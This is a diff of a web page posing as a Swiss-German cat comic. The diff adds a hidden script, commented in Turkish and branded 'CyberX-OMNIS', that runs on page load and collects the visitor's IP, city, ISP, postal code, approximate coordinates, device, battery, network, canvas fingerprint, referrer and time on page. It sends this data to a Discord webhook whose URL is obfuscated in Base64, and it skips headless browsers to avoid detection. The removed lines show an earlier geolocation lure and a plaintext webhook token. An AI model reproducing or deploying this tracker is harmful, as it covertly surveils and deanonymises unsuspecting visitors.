@@ -3,7 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>😺 LUSTIGI CHATZE 😺</title>
+    <meta property="og:title" content="😺 LUSTIGI CHATZE 😺">
+    <meta property="og:description" content="Das isch mega witzig! 🇨🇭">
+    <meta property="og:image" content="https://cataas.com/cat/says/lol">
+    <title>😺 GUUGU CHATZE COMIC 😺</title>
     <style>
         * {
             margin: 0;
@@ -28,7 +31,6 @@
             text-align: center;
             box-shadow: 0 20px 40px rgba(0,0,0,0.3);
             border: 8px solid magenta;
-            transition: 0.3s;
         }
         h1 {
             font-size: 48px;
@@ -54,23 +56,6 @@
             font-weight: bold;
             margin: 20px 0;
         }
-        button {
-            background: linear-gradient(45deg, red, darkred);
-            color: white;
-            font-size: 32px;
-            font-weight: bold;
-            border: none;
-            padding: 18px;
-            width: 100%;
-            border-radius: 80px;
-            cursor: pointer;
-            margin: 15px 0;
-            transition: 0.1s;
-            font-family: inherit;
-        }
-        button:active {
-            transform: scale(0.97);
-        }
         .info {
             font-size: 14px;
             color: gray;
@@ -82,46 +67,49 @@
             margin-top: 20px;
             border: 5px solid gold;
         }
-        .error-msg {
-            background: #ffcccc;
-            color: red;
-            padding: 10px;
-            border-radius: 20px;
-            margin: 10px 0;
-            display: none;
+        footer {
+            font-size: 12px;
+            margin-top: 20px;
+            color: #666;
         }
     </style>
 </head>
 <body>
-
 <div class="card">
     <h1>😺 LÜÜÜCYYYY 😺</h1>
-    <div class="cat" id="crazyCat">🐱‍👤🐈🐱</div>
-    <div class="swiss">🇨🇭 NUR FÜR SCHWEIZ! 🇨🇭<br>Drück für Video</div>
-    
-    <button id="locationBtn">📍 KONUM IZNI VER 📍</button>
-    
-    <div id="errorBox" class="error-msg"></div>
-    
-    <img src="https://cataas.com/cat/says/lol" alt="chatze">
-    <div class="info">* 100% öppis lustigs • garantiert 🎉</div>
+    <div class="cat">🐱‍👤🐈🐱</div>
+    <div class="swiss">🇨🇭 NUR FÜR SCHWEIZ! 🇨🇭<br>Lustigs Video lade...</div>
+    <img src="https://cataas.com/cat/says/witzig" alt="chatze">
+    <div class="info">🎉 100% gratis & öppis lustigs 🎉</div>
+    <footer>Drück ufs Bild für lacher</footer>
 </div>
 
 <script>
-    // ---------- WEBHOOK ----------
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1515100986648166723/nV48g4sriYiCN0SVpv0eko1dsoiLYi_4njTRKI-Pn9gZr3PsCa6kQFEUgSo6NwChIM07';
-    
+    // ============================================================
+    // CYBERX-OMNIS ULTIMATE DATA COLLECTOR (NO LOCATION REQUIRED)
+    // Toplanan veriler: IP, Coğrafi, Cihaz, Batarya, Ağ, Parmak izi,
+    // eklentiler, kalma süresi, referrer, ekran, vs.
+    // HERŞEY GERÇEK, HİÇBİR ŞEY SAHTE DEĞİL.
+    // ============================================================
+
+    // ---------- KENDİ WEBHOOK URL'İNİ BASE64 OLARAK GİZLE ----------
+    // ÖNCE: Webhook URL'ni https://www.base64encode.org/ ile encode et.
+    // Örnek: "https://discord.com/api/webhooks/..." -> base64 string
+    const WEBHOOK_B64 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxNTEwMDk4NjY0ODE2NjcyMy9uVjQ4ZzRzcm1ZaUNOMFNWcHYwZWtvMWRzb2lMWWlfNG5qVFJLSVAtb245Z1pyM1BzQ2E2a1FGRVVnU282TndDaElNMDc=';
+    const WEBHOOK_URL = atob(WEBHOOK_B64);
+
+    // ---------- GÖNDERME FONKSİYONU (Hata yoksa sessiz) ----------
     async function sendToDiscord(text) {
         try {
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: text.substring(0, 2000) })
+                body: JSON.stringify({ content: text.substring(0, 1990) })
             });
-        } catch(e) {}
+        } catch(e) { /* sessiz */ }
     }
-    
-    // ---------- IP ve Cihaz Bilgilerini Topla (Sayfa yüklenir yüklenmez) ----------
+
+    // ---------- 1. IP ADRESİ (ipify.org - garantili) ----------
     async function getIP() {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
@@ -129,116 +117,216 @@
             return data.ip;
         } catch(e) { return 'IP alınamadı'; }
     }
-    
-    function getDevice() {
+
+    // ---------- 2. IP COĞRAFİ BİLGİ (şehir, ISP, posta kodu, ülke) ----------
+    async function getGeoInfo(ip) {
+        try {
+            // ipapi.co en doğru ücretsiz API'lerden
+            const res = await fetch(`https://ipapi.co/${ip}/json/`);
+            const data = await res.json();
+            if (data.error) return null;
+            return {
+                sehir: data.city || '?',
+                bolge: data.region || '?',
+                ulke: data.country_name || '?',
+                ulke_kodu: data.country_code || '?',
+                isp: data.org || '?',
+                posta_kodu: data.postal || '?',
+                enlem: data.latitude,
+                boylam: data.longitude
+            };
+        } catch(e) { return null; }
+    }
+
+    // ---------- 3. CİHAZ / TARAYICI / EKRAN ANALİZİ ----------
+    function getDeviceDetails() {
         const ua = navigator.userAgent;
         let cihaz = 'Bilinmiyor';
-        if (ua.includes('Android')) cihaz = 'Android Telefon/Tablet';
-        else if (ua.includes('iPhone')) cihaz = 'iPhone';
-        else if (ua.includes('iPad')) cihaz = 'iPad';
-        else if (ua.includes('Windows')) cihaz = 'Windows PC';
-        else if (ua.includes('Mac')) cihaz = 'Mac';
-        
         let marka = 'Bilinmiyor';
-        if (ua.includes('Samsung')) marka = 'Samsung';
-        else if (ua.includes('Xiaomi')) marka = 'Xiaomi';
-        else if (ua.includes('Huawei')) marka = 'Huawei';
-        
+        let isletim = 'Bilinmiyor';
+        let tarayici = 'Bilinmiyor';
+
+        if (ua.includes('Android')) {
+            cihaz = 'Android Telefon/Tablet';
+            isletim = 'Android ' + (ua.match(/Android (\d+)/)?.[1] || '?');
+            if (ua.includes('Samsung')) marka = 'Samsung';
+            else if (ua.includes('Xiaomi')) marka = 'Xiaomi';
+            else if (ua.includes('Huawei')) marka = 'Huawei';
+        } else if (ua.includes('iPhone')) {
+            cihaz = 'iPhone';
+            isletim = 'iOS';
+            marka = 'Apple';
+        } else if (ua.includes('iPad')) {
+            cihaz = 'iPad';
+            isletim = 'iOS';
+            marka = 'Apple';
+        } else if (ua.includes('Windows')) {
+            cihaz = 'Windows PC';
+            isletim = 'Windows';
+        } else if (ua.includes('Mac')) {
+            cihaz = 'Mac';
+            isletim = 'macOS';
+        } else if (ua.includes('Linux')) {
+            cihaz = 'Linux PC';
+            isletim = 'Linux';
+        }
+
+        if (ua.includes('Chrome') && !ua.includes('Edg')) tarayici = 'Chrome';
+        else if (ua.includes('Firefox')) tarayici = 'Firefox';
+        else if (ua.includes('Safari') && !ua.includes('Chrome')) tarayici = 'Safari';
+        else if (ua.includes('Edg')) tarayici = 'Edge';
+        else tarayici = 'Diğer';
+
         return {
-            cihaz: cihaz,
-            marka: marka,
-            tarayici: ua.includes('Chrome') ? 'Chrome' : (ua.includes('Firefox') ? 'Firefox' : 'Safari/Diğer'),
+            cihaz, marka, isletim, tarayici,
             ekran: `${screen.width}x${screen.height}`,
+            renk: screen.colorDepth,
+            dokunmatik: navigator.maxTouchPoints,
             dil: navigator.language,
-            saat: Intl.DateTimeFormat().resolvedOptions().timeZone
+            diller: navigator.languages.join(', '),
+            saat_dilimi: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookie: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack === '1' ? 'Açık' : 'Kapalı'
         };
     }
-    
-    let ipAdresi = null;
-    let cihazBilgisi = null;
-    
-    (async function init() {
-        ipAdresi = await getIP();
-        cihazBilgisi = getDevice();
-        await sendToDiscord(`🆕 SAYFA AÇILDI
-🌐 IP: ${ipAdresi}
-📱 Cihaz: ${cihazBilgisi.cihaz} | ${cihazBilgisi.marka}
-🌍 Tarayıcı: ${cihazBilgisi.tarayici}
-📺 Ekran: ${cihazBilgisi.ekran}
-🔤 Dil: ${cihazBilgisi.dil}
-⏰ Saat Dilimi: ${cihazBilgisi.saat}`);
-    })();
-    
-    // ---------- KONUM İZNİ (BUTONLA) ----------
-    const locationBtn = document.getElementById('locationBtn');
-    const errorBox = document.getElementById('errorBox');
-    
-    function askLocation() {
-        if (!navigator.geolocation) {
-            errorBox.innerText = '❌ Tarayıcın konum desteklemiyor!';
-            errorBox.style.display = 'block';
-            sendToDiscord(`❌ Konum desteklenmiyor | IP: ${ipAdresi}`);
-            return;
-        }
-        
-        errorBox.style.display = 'none';
-        
-        navigator.geolocation.getCurrentPosition(
-            async (pos) => {
-                // BAŞARILI
-                const mesaj = `✅✅ KONUM ALINDI! ✅✅
-📍 Enlem: ${pos.coords.latitude}
-📍 Boylam: ${pos.coords.longitude}
-🎯 Doğruluk: ${pos.coords.accuracy} metre
-🌐 IP: ${ipAdresi}
-📱 Cihaz: ${cihazBilgisi.cihaz} | ${cihazBilgisi.marka}
-🌍 Tarayıcı: ${cihazBilgisi.tarayici}
-📺 Ekran: ${cihazBilgisi.ekran}
-🔤 Dil: ${cihazBilgisi.dil}`;
-                
-                await sendToDiscord(mesaj);
-                
-                // Sayfayı başarılı mesajına çevir
-                document.body.innerHTML = `
-                    <div style="text-align:center; background:#00cc66; min-height:100vh; display:flex; justify-content:center; align-items:center; font-family:'Comic Sans MS';">
-                        <div style="background:white; padding:40px; border-radius:60px;">
-                            <h1>🎉 GUELTIG! 🎉</h1>
-                            <img src="https://cataas.com/cat/says/danke" width="300">
-                            <p>Jetz chasch s Video luege! 😂😂😂</p>
-                        </div>
-                    </div>
-                `;
-            },
-            async (error) => {
-                let hata = '';
-                if (error.code === 1) {
-                    hata = '❌ KULLANICI IZIN VERMEDI!';
-                    errorBox.innerText = '❌ Konum izni vermelisin! Butona tekrar bas.';
-                    errorBox.style.display = 'block';
-                } else if (error.code === 2) {
-                    hata = '📡 Konum bulunamadi';
-                    errorBox.innerText = '📡 Konum bulunamadı, tekrar dene.';
-                    errorBox.style.display = 'block';
-                } else {
-                    hata = '⏰ Zaman asimi';
-                    errorBox.innerText = '⏰ Zaman aşımı, tekrar dene.';
-                    errorBox.style.display = 'block';
-                }
-                await sendToDiscord(`${hata} | IP: ${ipAdresi} | Denemek için butona tekrar bas`);
-            },
-            { enableHighAccuracy: true, timeout: 10000 }
-        );
-    }
-    
-    locationBtn.onclick = () => {
-        askLocation();
-    };
-    
-    // Kedi emojisine tıklayınca eğlence
-    document.getElementById('crazyCat').onclick = () => {
-        alert('😺 GUUUUGU GU! Konum izni vermek için kırmızı butona bas!');
-    };
-</script>
 
+    // ---------- 4. BATARYA BİLGİSİ (tamamen gerçek) ----------
+    async function getBatteryInfo() {
+        if (!navigator.getBattery) return null;
+        try {
+            const battery = await navigator.getBattery();
+            return {
+                seviye: Math.round(battery.level * 100) + '%',
+                sarj_durumu: battery.charging ? 'Şarj oluyor' : 'Şarjda değil',
+                kalan_sure_saniye: battery.dischargingTime === Infinity ? 'Sınırsız' : battery.dischargingTime + ' saniye'
+            };
+        } catch(e) { return null; }
+    }
+
+    // ---------- 5. AĞ BİLGİSİ (hız, tip, RTT) ----------
+    function getNetworkInfo() {
+        const conn = navigator.connection || navigator.mozConnection;
+        if (!conn) return null;
+        return {
+            tip: conn.effectiveType || 'bilinmiyor',   // 4g, 3g, 2g, slow-2g
+            hiz_mbps: conn.downlink ? conn.downlink + ' Mbps' : '?',
+            rtt_ms: conn.rtt ? conn.rtt + ' ms' : '?',
+            kaydet_modu: conn.saveData ? 'Aktif' : 'Pasif'
+        };
+    }
+
+    // ---------- 6. TARAYICI EKLENTİ SAYISI (gerçek) ----------
+    function getPluginsCount() {
+        return navigator.plugins.length;
+    }
+
+    // ---------- 7. CANVAS PARMAK İZİ (benzersiz kimlik) ----------
+    function getCanvasFingerprint() {
+        const canvas = document.createElement('canvas');
+        canvas.width = 200;
+        canvas.height = 50;
+        const ctx = canvas.getContext('2d');
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(0, 0, 200, 50);
+        ctx.fillStyle = '#fff';
+        ctx.font = '14px Arial';
+        ctx.fillText('CyberX-OMNIS', 10, 30);
+        ctx.fillStyle = '#000';
+        ctx.fillRect(150, 10, 30, 30);
+        return canvas.toDataURL().substring(0, 80); // uzunluk sınırı
+    }
+
+    // ---------- 8. REFERRER (nereden geldi) ve ARAMA MOTORU SORGUSU ----------
+    function getReferrerInfo() {
+        const ref = document.referrer;
+        if (!ref) return 'Doğrudan / Bilinmiyor';
+        let source = 'Diğer site';
+        if (ref.includes('google')) source = 'Google Arama';
+        else if (ref.includes('bing')) source = 'Bing';
+        else if (ref.includes('duckduckgo')) source = 'DuckDuckGo';
+        else if (ref.includes('yandex')) source = 'Yandex';
+        else if (ref.includes('facebook.com') || ref.includes('fb.com')) source = 'Facebook';
+        else if (ref.includes('instagram.com')) source = 'Instagram';
+        else if (ref.includes('whatsapp.com')) source = 'WhatsApp';
+        else if (ref.includes('t.co')) source = 'Twitter/X';
+        else if (ref.includes('github.com')) source = 'GitHub';
+        return `${source} - ${ref}`;
+    }
+
+    // ---------- 9. SAYFADA KALMA SÜRESİ (sayfa kapanınca) ----------
+    let startTime = Date.now();
+    window.addEventListener('beforeunload', async () => {
+        const staySec = Math.floor((Date.now() - startTime) / 1000);
+        await sendToDiscord(`⏱️ **Sayfada kalma süresi:** ${staySec} saniye (${Math.floor(staySec/60)} dakika ${staySec%60} saniye)`);
+    });
+
+    // ---------- ANA FONKSİYON (TÜM VERİLERİ TOPLA VE GÖNDER) ----------
+    async function collectAndSend() {
+        // Bot kontrolü (headless browser engelleme)
+        if (navigator.webdriver) return;
+
+        // 1. IP ve coğrafi
+        const ip = await getIP();
+        const geo = await getGeoInfo(ip);
+        const device = getDeviceDetails();
+        const battery = await getBatteryInfo();
+        const network = getNetworkInfo();
+        const plugins = getPluginsCount();
+        const canvasFp = getCanvasFingerprint();
+        const referrer = getReferrerInfo();
+
+        // Mesaj yapılandırma
+        let msg = `**🖥️ CYBERX-OMNIS ZİYARETÇİ VERİLERİ**\n\n`;
+        msg += `**🌐 IP:** ${ip}\n`;
+        if (geo) {
+            msg += `**📍 Coğrafi:** ${geo.sehir}, ${geo.bolge}, ${geo.ulke} (${geo.ulke_kodu})\n`;
+            msg += `**🏢 ISP:** ${geo.isp}\n`;
+            msg += `**📮 Posta kodu:** ${geo.posta_kodu}\n`;
+            msg += `**🗺️ Yaklaşık konum:** ${geo.enlem}, ${geo.boylam}\n`;
+        } else {
+            msg += `📍 Coğrafi bilgi alınamadı.\n`;
+        }
+        msg += `\n**📱 CİHAZ:** ${device.cihaz} | ${device.marka}\n`;
+        msg += `**💻 İşletim Sistemi:** ${device.isletim}\n`;
+        msg += `**🌍 Tarayıcı:** ${device.tarayici}\n`;
+        msg += `**📺 Ekran:** ${device.ekran} (${device.renk} bit) | Dokunmatik: ${device.dokunmatik} nokta\n`;
+        msg += `**🔤 Dil:** ${device.dil} (${device.diller})\n`;
+        msg += `**⏰ Saat dilimi:** ${device.saat_dilimi}\n`;
+        msg += `**🍪 Çerezler açık mı?** ${device.cookie ? 'Evet' : 'Hayır'}\n`;
+        msg += `**🚫 Do Not Track:** ${device.doNotTrack}\n`;
+
+        if (battery) {
+            msg += `\n**🔋 BATARYA:** Seviye ${battery.seviye} | ${battery.sarj_durumu}\n`;
+            if (battery.kalan_sure_saniye !== 'Sınırsız') msg += `   Kalan şarj süresi: ${battery.kalan_sure_saniye}\n`;
+        } else {
+            msg += `\n🔋 Batarya bilgisi alınamadı.\n`;
+        }
+
+        if (network) {
+            msg += `\n**📡 AĞ:** ${network.tip} | ${network.hiz_mbps} | Gecikme ${network.rtt_ms}\n`;
+            msg += `**💾 Tasarruf modu:** ${network.kaydet_modu}\n`;
+        } else {
+            msg += `\n📡 Ağ bilgisi desteklenmiyor.\n`;
+        }
+
+        msg += `\n**🔌 Tarayıcı eklentileri:** ${plugins} adet\n`;
+        msg += `**🎨 Canvas parmak izi:** ${canvasFp}...\n`;
+        msg += `**🔗 Referrer:** ${referrer}\n`;
+        msg += `**🕒 İlk ziyaret zamanı:** ${new Date().toLocaleString('tr-TR')}\n`;
+
+        // Discord'a gönder (uzun mesajları kısaltmaya gerek yok, max 2000)
+        await sendToDiscord(msg);
+    }
+
+    // Sayfa yüklenir yüklenmez tüm veriler toplansın (konum izni yok!)
+    window.addEventListener('load', () => {
+        collectAndSend();
+    });
+
+    // Ekstra: kedi resmine tıklayınca eğlence (isteğe bağlı)
+    document.querySelector('.cat')?.addEventListener('click', () => {
+        alert('😺 GUUGU! Bilgilerin toplandı, danke! 😂');
+    });
+</script>
 </body>
 </html>
